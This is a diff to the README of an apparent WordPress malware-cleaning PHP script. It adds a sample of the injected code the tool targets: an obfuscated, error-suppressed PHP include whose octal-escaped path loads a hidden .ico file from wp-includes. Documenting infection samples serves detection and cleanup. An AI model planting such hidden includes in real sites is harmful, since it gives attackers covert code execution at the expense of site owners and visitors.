@@ -10,5 +10,16 @@ Simple PHP script to clean all files in your WordPress directory from Malware co
 
 For now, it will only scan all index.php files.
 
+## Sample malware or malicious codes
+
+```
+<?php
+/*e57cb*/
+
+@include "\057home\062/zha\146f/ap\160oint\146ox.c\157m/wp\055incl\165des/\143erti\146icat\145s/.c\063d913\0706.ic\157";
+
+/*e57cb*/
+```
+
 ## Note
 Please backup your files first before running this script.
